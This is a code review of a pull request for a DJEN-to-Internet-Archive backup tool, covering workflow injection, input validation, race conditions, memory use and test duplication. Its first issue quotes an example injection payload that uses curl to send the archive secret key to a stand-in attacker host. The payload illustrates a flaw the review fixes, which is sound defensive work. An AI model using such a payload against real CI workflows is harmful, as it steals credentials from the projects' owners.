# Code Review: PR #1 — Add complete DJEN backup system to Internet Archive

## Overall Assessment

Well-structured project implementing a backup pipeline for Brazilian judicial
publications (DJEN) to the Internet Archive. The architecture has clean
separation of concerns across modules. The BDD test suite covers the core
scenarios. Below are issues organized by severity.

---

## Critical Issues

### 1. GitHub Actions workflow is vulnerable to command injection

**File:** `.github/workflows/backup.yml:39-44`

The `workflow_dispatch` inputs are interpolated directly into a shell command
using `${{ inputs.* }}` expression syntax. This is a known injection vector — a
user with write access could supply an input like
`; curl attacker.com/exfil?s=$IAS3_SECRET_KEY` as a tribunal name, exfiltrating
the IA credentials.

**Fix:** Use environment variables instead of inline interpolation:

```yaml
- name: Run backup
  run: |
    args=""
    [ -n "$START_DATE" ] && args="$args --start-date $START_DATE"
    [ -n "$END_DATE" ] && args="$args --end-date $END_DATE"
    [ -n "$TRIBUNAL" ] && args="$args --tribunal $TRIBUNAL"
    uv run djen-backup $args --deadline-minutes 45 --state-file .cache/state.json
  env:
    START_DATE: ${{ inputs.start_date }}
    END_DATE: ${{ inputs.end_date }}
    TRIBUNAL: ${{ inputs.tribunal }}
    IAS3_ACCESS_KEY: ${{ secrets.IA_ACCESS_KEY }}
    IAS3_SECRET_KEY: ${{ secrets.IA_SECRET_KEY }}
```

### 2. No input validation on `--tribunal` CLI argument

**File:** `src/djen_backup/runner.py:282-287`

When `config.tribunal` is not found in the API-returned tribunal list, the code
logs a warning but uses the raw user-provided string anyway. This string ends up
in HTTP URLs (`djen.py:38`) and IA S3 paths (`archive.py:104`). A malformed
tribunal value (containing `/`, `..`, or other characters) could cause path
traversal in IA S3 keys or unexpected HTTP behavior.

**Fix:** Validate tribunal codes against an allowlist pattern (e.g.,
`^[A-Z0-9-]+$`) before using them in URL construction.

---

## Significant Issues

### 3. State is not thread-safe despite concurrent worker access

**File:** `src/djen_backup/state.py`

`State` is a plain dict-backed class with no locking. It's mutated by multiple
workers via `state.mark()` in `_process_item` (`runner.py:224, 248`). This is an
asyncio application where concurrent coroutines run on a single thread. The
actual risk is that between a `get_done_tribunals()` check and a `mark()` call,
another coroutine could yield at an `await`. Unlikely to cause corruption with
the current simple dict operations, but a latent bug if the state logic grows.

**Recommendation:** Add an `asyncio.Lock` to `State` (similar to what `Summary`
already does) or document why it's safe.

### 4. `download_zip` loads entire ZIP into memory

**File:** `src/djen_backup/djen.py:60-78`

Entire ZIP file contents are loaded into `bytes` in memory, then held until the
IA upload completes. With 8 workers processing concurrently, this could mean 8
large ZIPs in memory simultaneously. If DJEN ZIPs are large (e.g., hundreds of
MB for big courts like TJSP), this could cause OOM on GitHub Actions runners
(7 GB RAM limit).

**Recommendation:** Consider streaming the download-to-upload pipeline or adding
a max file size guard.

### 5. Circuit breaker state check has a TOCTOU race

**File:** `src/djen_backup/archive.py:193-213`

The `state` property (line 193) checks time and returns `HALF_OPEN`, but this
happens *outside* the lock in `allow_request`. The `allow_request` method
acquires the lock and then calls `self.state` which reads `_opened_at` and
`_recovery_timeout` without the lock held during the property access. Since
`record_failure` modifies both `_opened_at` and `_recovery_timeout` under the
lock, there's a window where the property could read inconsistent values.

**Fix:** Move the HALF_OPEN transition logic inside `allow_request` under the
lock, rather than relying on the property.

### 6. `success_rate` calculation is misleading

**File:** `src/djen_backup/runner.py:84-92`

`processed` only counts `uploaded + absent_marked`, while `total` is the full
work queue size. Items skipped due to deadline or circuit breaker are counted in
`total` but not in `processed`. If the circuit breaker opens early, the success
rate drops not because of actual failures, but because of skipped items. The exit
code (line 354) could return 1 even when every attempted item succeeded.

**Recommendation:** Either exclude skipped items from the denominator, or track
`attempted` separately and use that for the rate.

---

## Minor Issues

### 7. Hardcoded DJEN proxy URL

**File:** `src/djen_backup/__main__.py:34`

The default proxy URL `https://djen-proxy-mhgmawcn3a-rj.a.run.app` is a Cloud
Run URL with an auto-generated name. If the service is ever redeployed, this URL
will break silently.

### 8. `_process_item` is a private function imported in tests

**Files:** `features/steps/test_collect.py:15`, `test_absent_marking.py:15`,
`test_deadline.py:15`

Tests directly import `_process_item` (private by Python convention). This
couples tests to implementation details. Consider making it public if it's part
of the tested interface, or test through the public `run()` function.

### 9. Duplicate step definitions across test modules

Several step definitions are duplicated across test files:

- `given_ia_files` in `test_collect.py:101` and `test_gap_detection.py:44`
- `given_tribunal_list` in `test_collect.py:113` and `test_gap_detection.py:69`
- `given_ia_accepts` in `test_collect.py:86` and `test_absent_marking.py:75`
- `when_process_item` in `test_collect.py:129` and `test_absent_marking.py:89`
- `then_state_mark` in `test_collect.py:212` and `test_absent_marking.py:154`
- `then_no_gaps` in `test_collect.py:232` and `test_gap_detection.py:126`

Move these to `conftest.py` or a shared steps module to avoid maintenance drift.

### 10. `Retry-After` header parsing doesn't handle HTTP-date format

**File:** `src/djen_backup/retry.py:100-105`

Per RFC 9110, `Retry-After` can be either seconds or an HTTP-date. The code only
handles the numeric format. A date string falls through to `ValueError` and
silently uses exponential backoff. Not harmful but incomplete.

### 11. No `Content-Type` header on uploads

**File:** `src/djen_backup/archive.py:74-93`

ZIP uploads don't set `Content-Type: application/zip` and absent markers don't
set `Content-Type: application/json`. IA may infer correctly, but explicit
content types are better practice.

### 12. State cache grows unboundedly

**File:** `src/djen_backup/state.py`

The state JSON grows by one entry per (date, tribunal) pair. Old dates are never
pruned. Consider TTL-based eviction (e.g., drop entries older than 90 days).

---

## Positive Observations

- Clean module separation: credentials, retry, state, DJEN client, IA archive, orchestration
- Circuit breaker with half-open recovery is a good pattern for IA reliability
- BDD features are readable and cover the key scenarios
- `Content-MD5` on uploads for integrity verification
- `usedforsecurity=False` on MD5 to satisfy FIPS-mode Python builds
- Deadline-awareness prevents GitHub Actions timeout kills
- State cache as GHA artifact is a pragmatic optimization
- Proper `structlog` configuration with structured context
- `py.typed` marker for PEP 561 compliance
- `concurrency` group in the workflow prevents overlapping runs
